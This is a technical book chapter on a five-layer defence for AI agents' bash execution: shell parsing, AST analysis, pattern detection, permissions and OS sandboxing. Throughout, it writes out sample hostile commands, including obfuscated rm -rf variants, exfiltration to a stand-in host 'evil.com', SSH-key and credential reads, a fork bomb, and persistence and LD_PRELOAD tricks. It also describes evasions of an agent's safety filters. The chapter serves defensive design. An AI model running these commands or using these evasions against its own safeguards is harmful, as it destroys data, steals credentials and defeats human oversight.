Chapter 19: Bash Security Architecture

Giving an AI agent a shell is like giving a teenager the car keys. The shell is the most powerful tool in a CLI agent's arsenal --- it can install packages, run tests, manage version control, deploy applications, and automate any task that a human could perform at the terminal. It is also the most dangerous. A single malformed command can delete the filesystem, exfiltrate credentials, install a backdoor, or brick the operating system. The shell is the tool where the gap between "useful" and "catastrophic" is narrowest.

This chapter presents the architecture of a multi-layer security system for bash command execution in AI agents. We will examine why the shell is uniquely dangerous, why regex-based security fails, how to build a full shell parser for security analysis, the five security layers from parsing to sandbox enforcement, and the dangerous pattern categories that every CLI agent must detect. The design philosophy is defense-in-depth: any single layer can be bypassed, but all layers together are strong.

19.1 Why Bash Is the Primary Threat Vector

Before designing defenses, you must understand the threat. Bash is the primary attack surface for AI CLI agents for four reasons:

Reason 1: Turing-complete command construction. The shell is not a simple command dispatcher --- it is a programming language. Variable expansion, command substitution, process substitution, heredocs, brace expansion, arithmetic expansion, and quoting rules mean that the "command" the shell executes may look nothing like the string the agent produced.

# These all delete /etc/passwd:
rm /etc/passwd
rm /etc/pass'w'd
rm /etc/pass""wd
rm "/etc/pass$(echo w)d"
eval "rm /etc/passwd"
base64 -d <<< 'cm0gL2V0Yy9wYXNzd2Q=' | sh

Reason 2: Side effects are invisible. File reads and web fetches have clear, bounded effects. Shell commands can have arbitrary side effects: writing files, modifying environment variables, starting background processes, opening network connections, modifying cron jobs, and more --- all from a single line.

Reason 3: Chaining and piping. A single bash command can contain multiple operations chained with &&, ||, ;, |, or process substitution. The first half of the command may be benign, but the second half is destructive:

git status && rm -rf /                 # Safe command chains to catastrophe
cat README.md | curl -d @- evil.com    # Read chains to exfiltration

Reason 4: Environment interaction. Shell commands inherit the user's full environment: PATH, aliases, shell functions, environment variables, and permissions. A command that is safe in isolation may be dangerous in a specific environment where python aliases to a compromised binary or PATH includes an attacker-controlled directory.

19.2 Why Regex-Based Security Fails

The naive approach to bash security is regex pattern matching: scan the command string for dangerous patterns and block matches. This approach fails for fundamental reasons.

Encoding and Escaping

# Pattern: block "rm -rf /"
rm -rf /                    # Caught
rm -rf '/'                  # Missed (quotes)
rm -rf "/"                  # Missed (double quotes)
rm -rf \/                   # Missed (escaped slash)
rm -r -f /                  # Missed (split flags)
rm --recursive --force /    # Missed (long flags)
\rm -rf /                   # Missed (escaped command name)
command rm -rf /            # Missed (explicit command dispatch)

Each evasion exploits a different shell feature. A regex would need to account for all of them, and new evasions are always possible.

Aliasing and Indirection

alias please='sudo'
please rm -rf /              # Alias indirection

export TARGET="/"
rm -rf "$TARGET"             # Variable indirection

eval "$(echo cm0gLXJmIC8= | base64 -d)"  # Encoding indirection

Regex cannot resolve aliases, expand variables, or decode base64. The command string says one thing; the shell does another.

Compound Commands

# This is a single "command" with multiple operations:
{ echo "Building..."; cd /; rm -rf *; } 2>/dev/null

# Subshell:
(cd / && rm -rf *)

# Command substitution:
echo "$(rm -rf /)"

# Process substitution:
diff <(cat /etc/shadow) <(cat /etc/passwd)

Regex treats the string as flat text. The shell treats it as a structured program with scoping, grouping, and nesting. Flat text analysis cannot capture structural semantics.

The Fundamental Limitation

Regex operates on the lexical surface of the command. Security requires understanding the semantic structure. The gap between "what the string looks like" and "what the shell will do" is the gap that attackers exploit. Closing this gap requires parsing the command into an AST and analyzing the AST --- the same approach that compilers use to understand source code.

19.3 The Five-Layer Security Architecture

The bash security system uses five layers, each operating at a different level of abstraction:

19.4 Layer 1: Full Shell Parsing

The first layer transforms the raw command string into a structured Abstract Syntax Tree (AST). This is the most technically demanding layer and the foundation that all other layers depend on.

Why a Full Parser

A bash parser must handle:

  • Quoting rules: Single quotes (literal), double quotes (with expansion), dollar-single-quotes (ANSI-C)
  • Variable expansion: $VAR, ${VAR}, ${VAR:-default}, ${#VAR}
  • Command substitution: $(command), `command`
  • Arithmetic expansion: $((expr))
  • Brace expansion: {a,b,c}, {1..10}
  • Glob patterns: *, ?, [...]
  • Redirections: >, >>, 2>&1, &>, heredocs
  • Pipelines: cmd1 | cmd2 | cmd3
  • Lists: cmd1 && cmd2, cmd1 || cmd2, cmd1 ; cmd2
  • Compound commands: if/then/fi, for/do/done, while/do/done, { group; }, (subshell)
  • Functions: name() { body; }
  • Coprocesses: coproc cmd
  • Heredocs: <<EOF ... EOF, <<'EOF' ... EOF (with and without expansion)

A production shell parser runs to 2,000-5,000 lines depending on the language and how many edge cases it handles. This is a significant engineering investment, but there is no shortcut: every feature the parser does not handle is a feature that attackers can use for evasion.

The AST Structure

The parser produces an AST with node types that correspond to shell constructs:

AST Node Types:
  SimpleCommand    → "git status" (a single command with arguments)
  Pipeline         → "cmd1 | cmd2" (piped commands)
  List             → "cmd1 && cmd2" (conditional/sequential commands)
  Subshell         → "(cmd)" (commands in a subshell)
  Group            → "{ cmd; }" (grouped commands in current shell)
  If               → "if cmd; then cmd; fi"
  For              → "for x in list; do cmd; done"
  While            → "while cmd; do cmd; done"
  Function         → "name() { cmd; }"
  Redirection      → "> file", "2>&1"
  Assignment       → "VAR=value"
  CommandSubst     → "$(cmd)"

The critical property of the AST is that it makes the command's structure explicit. echo "safe" && rm -rf / as text looks like a single command. As an AST, it is clearly a List with two SimpleCommand children, and the second child is analyzed independently.

Parse Failure Policy

What happens when the parser cannot parse a command? This is a critical design decision:

Option A: Block unparseable commands. Safe, but prevents legitimate commands that use shell features the parser does not handle.

Option B: Allow unparseable commands with a warning. Permissive, but opens a bypass vector: craft commands that are valid bash but confuse the parser.

Option C: Allow unparseable commands but skip AST-based analysis, relying on pattern matching and sandboxing. This is the pragmatic middle ground. The command bypasses Layer 2 (AST analysis) but still goes through Layer 3 (pattern matching), Layer 4 (permissions), and Layer 5 (sandbox). This accepts a narrower security margin for commands the parser cannot handle while maintaining the baseline protection.

Most production implementations choose Option C, because bash's syntax is vast enough that no parser handles 100% of valid commands. The key is measuring: track how many commands fail parsing in production and improve the parser to cover common failure patterns.

19.5 Layer 2: AST Analysis

With the command parsed into an AST, Layer 2 classifies the intent of each command node. This is where the system reasons about what the command does, not just what it looks like.

Command Classification

Each SimpleCommand node is classified into a risk category:

graph TD
    CMD["SimpleCommand Node"] --> Resolve["Resolve command name<br/>(strip quoting, follow aliases)"]
    Resolve --> Classify{"Classify by<br/>command name"}

    Classify -->|"ls, cat, echo, pwd"| RO["READ-ONLY"]
    Classify -->|"git, cargo, npm, python"| DT["DEV-TOOL"]
    Classify -->|"pip install, npm install"| WR["WRITE"]
    Classify -->|"sudo, chmod, chown"| SM["SYSTEM-MODIFY"]
    Classify -->|"rm -rf, dd, mkfs"| DE["DESTRUCTIVE"]
    Classify -->|"eval, source, exec"| IN["INDIRECT<br/>(analyze argument)"]
    Classify -->|unknown| UN["UNKNOWN"]

Indirect Execution Analysis

The most architecturally interesting classification is INDIRECT --- commands that execute other commands:

Indirect Command What It Does Analysis Required
eval "$CMD" Evaluates string as shell code Must analyze the string content
source script.sh Executes file in current shell Must analyze file contents (or block)
exec cmd Replaces current process Must classify the replacement command
xargs cmd Executes cmd with piped arguments Must classify the base command
bash -c "cmd" Runs cmd in new shell Must recursively parse and analyze
sh -c "cmd" Same as above Same analysis
env KEY=val cmd Runs cmd with modified environment Must classify the inner command

For eval and bash -c, the system recursively parses the argument string and analyzes the inner AST. This catches evasion through indirection:

# Without recursive analysis, this looks like "bash with a string argument":
bash -c 'rm -rf /'

# With recursive analysis, the inner command is parsed and classified as DESTRUCTIVE

The recursion has a depth limit (typically 3-5 levels) to prevent adversarial nesting: bash -c "bash -c \"bash -c 'bash -c ...'\"". Beyond the depth limit, the command is classified as UNKNOWN and handled by downstream layers.

Pipeline and List Analysis

For compound commands, the classification is the maximum risk of any component:

# Pipeline: max(READ-ONLY, DESTRUCTIVE) = DESTRUCTIVE
git log | xargs rm -rf

# List: max(DEV-TOOL, DESTRUCTIVE) = DESTRUCTIVE
cargo test && rm -rf /

# Group: max(READ-ONLY, WRITE) = WRITE
{ echo "starting"; npm install; }

This conservative approach means that a safe command chained with a dangerous command escalates the entire chain. This prevents the "trojan horse" pattern where a benign first command establishes user trust and the dangerous second command executes under that false trust.

AST Rewriting for Analysis

Some shell features require AST rewriting before classification. Brace expansion, for example, transforms a single token into multiple tokens:

rm -rf /usr/{bin,lib,share}
# After brace expansion: rm -rf /usr/bin /usr/lib /usr/share

The analyzer must expand braces to classify the actual paths being targeted. Similarly, tilde expansion (~ to the home directory) and glob patterns (*.py) must be resolved to understand which files the command affects.

19.6 Layer 3: Dangerous Pattern Detection

Layer 3 applies structured pattern matching to both the raw command string and the AST. This layer catches known-dangerous patterns that the AST classification in Layer 2 might miss due to incomplete parsing or novel evasion techniques.

The Eight Categories

Dangerous patterns are organized into eight categories, each targeting a different class of threat:

Category 1: Filesystem Destruction

Commands that delete, overwrite, or corrupt files and directories:

rm -rf /          Recursive forced deletion from root
rm -rf /*         Delete all top-level directories
rm -rf ~          Delete home directory
> /important/file  Truncate file to zero bytes
mv /etc /dev/null  Move system directory to null device

Detection strategy: Look for recursive deletion commands targeting system paths (/, /etc, /usr, /var, /home, /root). Flag any rm -rf where the target resolves to a path above the project directory.

Category 2: Privilege Escalation

Commands that gain elevated permissions or modify access controls:

sudo su -                        Switch to root
chmod 777 /                      World-writable root
chmod -R 777 /etc                Recursive world-writable system dir
chown -R $USER:$GROUP /usr       Take ownership of system directory
setuid on an executable          Enable SUID bit

Detection strategy: Flag sudo with interactive commands, chmod with 777 or SUID patterns, and chown targeting system directories.

Category 3: Network Exfiltration

Commands that send data to external servers:

curl -d @/etc/passwd evil.com      Upload file contents
cat ~/.ssh/id_rsa | nc evil.com 80 Pipe secrets to netcat
wget -q -O- evil.com | sh         Download and execute
scp sensitive.db user@evil.com:    Copy file to remote

Detection strategy: Flag any command that combines file-reading operations (cat, $(), redirection) with network-sending operations (curl -d, nc, scp, rsync to external hosts). The combination is the threat --- reading a file is fine, sending data is fine, but reading a sensitive file and sending it is exfiltration.

Category 4: Credential Theft

Commands that read, copy, or transmit credential files:

cat ~/.ssh/id_rsa                Read SSH private key
cat ~/.aws/credentials           Read AWS credentials
printenv | grep KEY              Extract API keys from environment
history                          Read command history (may contain tokens)

Detection strategy: Maintain a list of known credential paths (see Chapter 18's protected path patterns) and flag any command that reads them. Also flag commands that dump environment variables, as environment variables often contain API keys and tokens.

Category 5: History and Audit Manipulation

Commands that tamper with logs, shell history, or audit trails:

history -c                       Clear shell history
unset HISTFILE                   Disable history recording
> ~/.bash_history                Truncate history file
shred -u /var/log/auth.log      Securely delete auth log

Detection strategy: Flag commands that modify or delete history files, unset history-related variables, or target log directories.

Category 6: Process Manipulation

Commands that interfere with other processes or system services:

kill -9 -1                       Kill all user processes
killall -9 sshd                  Kill SSH daemon
:(){ :|:& };:                    Fork bomb (exhaust process table)
nohup backdoor &                 Start persistent background process

Detection strategy: Flag kill commands targeting system processes, fork patterns (a function that calls itself with piping and backgrounding), and commands that start persistent background processes with nohup or disown.

Category 7: Environment Modification

Commands that modify the shell environment in ways that persist beyond the current command:

export PATH="/evil/bin:$PATH"    Prepend malicious directory to PATH
alias sudo='evil_sudo'           Shadow sudo with malicious function
export LD_PRELOAD=/evil/lib.so   Inject shared library into all processes

Detection strategy: Flag modifications to security-critical environment variables (PATH, LD_PRELOAD, LD_LIBRARY_PATH, HOME, SHELL) and alias/function definitions that shadow security-sensitive commands.

Category 8: Persistence Mechanisms

Commands that install mechanisms to survive beyond the current session:

crontab -e                       Modify cron schedule
echo "* * * * * cmd" >> /etc/crontab  Install cron job
echo "cmd" >> ~/.bashrc          Execute on every shell start
systemctl enable evil.service    Enable service at boot
launchctl load evil.plist        macOS: load launch agent

Detection strategy: Flag modifications to cron, systemd, launchd, shell RC files, and system startup directories.

Pattern Matching Implementation

Each pattern is a structured record with metadata:

Pattern:
  id:          "rm-rf-root"
  category:    FilesystemDestruction
  severity:    Critical
  regex:       rm\s+(-[rf]{1,2}\s+)*(--(force|recursive)\s+)*[/~]
  description: "Recursive forced deletion from root or home"
  action:      Block (with explanation)

Patterns are applied against both the raw command string (catching simple cases) and individual AST nodes (catching commands hidden in pipelines or compound statements). The dual application ensures that a dangerous command is caught whether it appears at the top level or nested inside a subshell.

19.7 Layer 4: Per-Command Permission Evaluation

After AST analysis and pattern matching, the command reaches the permission system described in Chapter 18. At this layer, the command's risk classification feeds into the permission evaluation algorithm:

  • READ-ONLY commands are auto-approved in all modes except deny-all.
  • DEV-TOOL commands are auto-approved in auto and bypass modes.
  • WRITE commands trigger the rule cascade (deny/ask/allow matching).
  • SYSTEM-MODIFY commands always ask in default mode, always escalate in auto mode.
  • DESTRUCTIVE commands are blocked before reaching the permission system (Layer 3 catches them).
  • UNKNOWN commands are treated as WRITE by default.

The integration point between the bash security layers and the permission system is the risk classification. Layers 1-3 produce the classification; Layer 4 evaluates it against the user's configured permission rules.

19.8 Layer 5: OS-Level Sandbox Enforcement

The final layer is the operating system sandbox. Even if all four previous layers fail --- the parser misses a construct, the AST analyzer misclassifies the command, the pattern matcher does not recognize the pattern, and the permission system approves it --- the sandbox limits the damage.

macOS: Seatbelt (sandbox-exec)

macOS provides the sandbox-exec system call, which enforces a profile that restricts process capabilities:

(version 1)
(deny default)                          ; Deny everything by default

(allow file-read*)                      ; Allow reading any file
(allow file-write*
  (subpath "/Users/dev/project")        ; Allow writing only to project dir
  (subpath "/tmp")                      ; Allow writing to /tmp
  (subpath "/private/tmp"))             ; Allow writing to macOS /tmp

(deny file-write*
  (subpath "/Users/dev/project/.env")   ; Deny writing to .env
  (subpath "/Users/dev/project/.git"))  ; Deny writing to .git directly

(allow process-exec)                    ; Allow running programs
(deny network*)                         ; Deny all network access
(allow network*
  (local ip "localhost:*"))             ; Except localhost

The sandbox profile operates at the syscall level --- it cannot be bypassed by shell tricks, encoding, or indirection. If the profile denies network access, curl fails regardless of how the command was constructed. This is why the sandbox is the last line of defense: it operates below the abstraction level that attackers manipulate.

Limitations: macOS seatbelt profiles are inflexible at runtime. The profile is set when the process launches and cannot be modified. This means the sandbox must be configured for the entire session, not per-command. A session that needs network access for git push cannot have a "deny network" sandbox, even if most commands should not access the network.

Linux: seccomp-BPF

Linux uses seccomp-BPF (Secure Computing Mode with Berkeley Packet Filter) for syscall filtering:

// Allow only a whitelist of syscalls
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 
             offsetof(struct seccomp_data, nr)),

    // Allow read, write, open, close, stat, fstat
    ALLOW_SYSCALL(SYS_read),
    ALLOW_SYSCALL(SYS_write),
    ALLOW_SYSCALL(SYS_openat),
    ALLOW_SYSCALL(SYS_close),
    ALLOW_SYSCALL(SYS_fstat),

    // Block network syscalls
    DENY_SYSCALL(SYS_socket),
    DENY_SYSCALL(SYS_connect),
    DENY_SYSCALL(SYS_bind),
    DENY_SYSCALL(SYS_listen),

    // Default: kill process on unauthorized syscall
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
};

seccomp-BPF is more granular than macOS seatbelt --- it can filter individual syscalls with argument inspection. However, it is also harder to configure correctly. A profile that blocks SYS_socket prevents not just curl but also local Unix domain sockets, which many legitimate tools use for IPC.

Network Restrictions

Both sandbox mechanisms can restrict network access, but the granularity differs:

Sandbox Network Restriction Granularity
macOS seatbelt Per-IP, per-port, local vs remote
Linux seccomp Per-syscall (socket, connect, bind)
Linux network namespaces Complete network isolation

For most AI agents, the right network policy is "allow localhost, deny everything else." This permits local dev servers, databases, and MCP servers while blocking exfiltration to external hosts. Tools that need network access (like git push or npm publish) can be exempted by running them outside the sandbox, with the permission system controlling when the exemption is granted.

Sandbox Design Patterns

Pattern: Progressive sandbox relaxation. Start with a tight sandbox (deny all writes, deny network) and relax restrictions as the user approves specific operations. This mirrors the progressive trust concept from Chapter 18.

Pattern: Per-command sandbox profiles. Instead of one sandbox for the entire session, apply different sandbox profiles to different commands based on their risk classification. A git status gets the tight profile (deny writes, deny network). A git push gets a looser profile (allow network). This requires process-level sandboxing with profile selection per spawn.

Pattern: Sandbox verification. Before executing any bash command, verify that the sandbox is active. If the sandbox process crashes or fails to initialize, fall back to deny-all mode rather than executing commands without containment.

19.9 Path Analysis and Resolution

Several security layers need to know which files a command will affect. Determining the actual target paths of a shell command is surprisingly complex.

Relative Path Resolution

cd /tmp && rm -rf ../../etc/passwd

The rm command's argument is relative to /tmp, so the actual target is /etc/passwd. The path analyzer must track cd commands within compound statements and resolve relative paths accordingly.

Symlink Detection

ln -s /etc/passwd /tmp/innocent.txt
rm /tmp/innocent.txt  # Actually deletes /etc/passwd

The path analyzer should resolve symlinks to determine the actual target. This requires filesystem access (calling readlink or equivalent), which introduces a TOCTOU (time-of-check-time-of-use) race: the symlink could be created between analysis and execution. The sandbox (Layer 5) mitigates this by restricting which paths can be written regardless of symlinks.

Directory Traversal

cat ../../../../etc/shadow

Paths with .. components must be resolved to their canonical form before checking against protected path lists. The .. resolution must be filesystem-aware: /home/user/../../../etc resolves to /etc, not to a directory above root.

Glob Expansion

rm -rf /etc/p*

Glob patterns match against the actual filesystem. The path analyzer must expand globs to determine which files would be affected. This is expensive (it requires filesystem enumeration) and imperfect (the filesystem state at analysis time may differ from execution time). The pragmatic approach is to check whether the glob's non-wildcard prefix matches a protected directory, without fully expanding the glob.

19.10 Defense-in-Depth: Why All Five Layers Matter

No single layer is sufficient. Each has weaknesses:

Layer Weakness
Parser May not handle all bash syntax edge cases
AST Analysis Cannot resolve runtime values (variables, command substitution results)
Pattern Matching Static patterns cannot anticipate novel evasion techniques
Permission System Users can approve dangerous commands; auto-mode classifier can make mistakes
Sandbox Configured for the session, not per-command; may be too loose or too tight

Together, they compensate for each other's weaknesses:

graph TD
    subgraph Layers["How Layers Compensate"]
        A["Parser misses<br/>encoded command"] --> B["Pattern matcher<br/>catches base64 pipe"]
        C["AST misses<br/>alias indirection"] --> D["Sandbox blocks<br/>unauthorized file write"]
        E["Pattern matcher misses<br/>novel command"] --> F["Permission system<br/>asks user"]
        G["User approves<br/>bad command"] --> H["Sandbox limits<br/>blast radius"]
    end

The key insight: each layer is designed to catch the failures of the layers above it. The parser catches what regex would miss. AST analysis catches what the parser cannot classify. Pattern matching catches known dangerous patterns regardless of how they are expressed. The permission system catches novel threats by asking the human. The sandbox catches everything that gets past the human.

19.11 Real-World Evasion Techniques and How Each Layer Responds

Theory is one thing. Here are concrete evasion attempts and how the five-layer architecture handles each:

Evasion: Unicode Homoglyph Substitution

# The "r" in "rm" is actually a Cyrillic "р" (U+0440)
рm -rf /
  • Layer 1 (Parser): Parses normally --- the parser sees a command token.
  • Layer 2 (AST Analysis): Fails to classify --- рm is not in the known command database.
  • Layer 3 (Pattern Matching): String patterns may miss if not Unicode-normalized. A well-designed pattern matcher normalizes Unicode before matching.
  • Layer 4 (Permissions): Unknown commands require approval in default mode.
  • Layer 5 (Sandbox): The shell itself will fail to find the рm binary (it does not exist), so this particular evasion is actually harmless. But the general technique --- substituting visually similar characters --- works against human review, not against the shell.

Lesson: Normalize Unicode at the entry point of the security pipeline. Layer 1 should produce a canonical, ASCII-normalized command representation for all downstream analysis.

Evasion: Time-of-Check-to-Time-of-Use (TOCTOU)

# At check time: /tmp/safe_script.sh contains "echo hello"
# Between check and execution: attacker replaces it with "rm -rf /"
bash /tmp/safe_script.sh
  • Layers 1-4: Analyze the command as "execute a script." The script's contents at analysis time are safe.
  • Layer 5 (Sandbox): The sandbox restricts what the script can do regardless of its contents. If the sandbox denies writes to /, the replacement script fails.

Lesson: TOCTOU attacks bypass content analysis entirely because the content changes between analysis and execution. The sandbox is the only defense that works at execution time.

Evasion: Bash Function Shadowing

# Define a function that shadows a safe command
function git() { rm -rf /; }
git status  # Actually runs rm -rf /
  • Layer 1 (Parser): Parses the function definition and the call separately.
  • Layer 2 (AST Analysis): If the AST analyzer tracks function definitions, it detects the shadow. If not, git status is classified as a safe DEV-TOOL.
  • Layer 3 (Pattern Matching): The rm -rf / in the function body is caught.
  • Layer 4 (Permissions): If Layer 3 catches it, the permission system blocks. If it does not, git status is auto-approved.
  • Layer 5 (Sandbox): Blocks the underlying rm -rf / regardless of how it was invoked.

Lesson: AST analysis should track function definitions and flag any function that shadows a known command name with different behavior. This is a static analysis problem --- treat function definitions as potential command redefinitions and analyze the body.

Evasion: Split Command Across Multiple Tool Calls

# Call 1: Install a malicious alias
echo "alias test='rm -rf /'" >> ~/.bashrc

# Call 2 (later in session): Source the modified bashrc
source ~/.bashrc

# Call 3 (later): Run the "test" command
test
  • Individual layer analysis: Each command in isolation looks benign or moderately risky. echo appending to .bashrc is a write (flagged), source is indirect execution (flagged), and test is a builtin (allowed).
  • Cross-command analysis: Detecting this pattern requires correlating multiple tool calls across time --- something that no single-command analysis can do.

Lesson: Single-command analysis cannot detect multi-step attacks. Defenses include: (1) protecting shell config files (.bashrc, .zshrc) in the blocked path list, (2) flagging source of user-writable files, and (3) the sandbox preventing writes to shell config files in the first place.

19.12 Practical Considerations for Production

Performance Budget

The security pipeline adds latency to every bash command. The budget:

Layer Target Latency Acceptable Range
Parse <5ms 1-10ms
AST Analysis <2ms 1-5ms
Pattern Matching <1ms 0.5-3ms
Permission Evaluation <1ms 0.5-2ms
Sandbox Setup <10ms 5-20ms
Total <20ms 10-40ms

A 20ms overhead on a command that takes 5 seconds to execute is invisible. On a command that takes 10ms (like echo "hello"), it doubles the execution time. For ultra-fast commands, consider caching the security analysis: if the exact same command was approved within the last N seconds, skip the pipeline.

False Positive Management

A security system that blocks too many legitimate commands will be bypassed. Track false positive rates by category:

Category Acceptable FP Rate Mitigation
Filesystem Destruction 5% Users confirm false positives once, session memory caches
Network Exfiltration 10% Many dev tools fetch URLs; need broad allowlisting for known tools
Credential Theft 2% Protected path list should be curated, not overly broad
Process Manipulation 15% Process management is common in dev; kill for test processes is routine

The overall target: fewer than 1 in 20 commands should trigger a false positive in a typical development session. Above that rate, users will switch to bypass mode.

Logging and Auditability

Every security decision should be logged with:

  • The raw command string
  • The AST (if parsing succeeded)
  • The risk classification
  • Which layer produced the decision
  • The decision (allow/deny/ask) and reason
  • The user's response (if asked)

This audit log serves two purposes: debugging false positives ("why was my legitimate command blocked?") and incident response ("what commands did the agent execute during the compromised session?").

19.13 Architectural Patterns and Takeaways

Pattern: Semantic Analysis Over String Matching

Parse the command into a structured representation (AST) and analyze the structure, not the surface text. This pattern applies far beyond bash security --- any input validation that operates on structured data should parse first, validate second.

Pattern: Conservative Composition

When a compound command contains both safe and dangerous components, classify the whole as dangerous. This is the "weakest link" principle applied to command analysis. A pipeline is only as safe as its most dangerous stage.

Pattern: Defense-in-Depth with Diverse Mechanisms

The five layers use different mechanisms: syntactic analysis, semantic classification, pattern matching, policy evaluation, and OS-level enforcement. Diversity matters because a single mechanism (like regex) has a single class of weakness. Diverse mechanisms have independent failure modes, making simultaneous bypass exponentially harder.

Pattern: Fail-Open Parse with Fail-Closed Default

When the parser fails, the command bypasses AST analysis but still faces pattern matching, permissions, and sandboxing. This is fail-open for parsing but fail-closed overall: the unparsed command is treated as high-risk, not as safe.

Pattern: Recursive Indirection Resolution

Commands that execute other commands (eval, bash -c, xargs) are recursively analyzed by re-entering the security pipeline. The recursion has a depth limit to prevent adversarial nesting. Beyond the limit, the command is classified as unknown/high-risk.

Summary

Bash security for AI CLI agents requires a multi-layer architecture because no single defense is sufficient. Regex fails because the shell's syntax is too rich for flat text analysis. Pattern matching catches known threats but misses novel evasion. Permissions depend on users making good decisions under fatigue. Sandboxes are configured for the session, not per-command.

The five-layer architecture --- parse, analyze, pattern-match, permit, sandbox --- provides defense-in-depth where each layer catches the failures of the layers above it. The parser transforms strings into structure. The AST analyzer classifies intent. Pattern matching detects known dangers. The permission system involves the human. The sandbox limits the blast radius when everything else fails.

For engineers building AI agents with shell access: start with the blocked command list and the sandbox. These two layers alone prevent the catastrophic cases. Add the parser and AST analysis when you need to handle sophisticated evasion. Add pattern matching for known threats. The permission system and auto-mode classifier (Chapter 18) provide the UX layer that makes all of this usable without driving users to bypass mode.
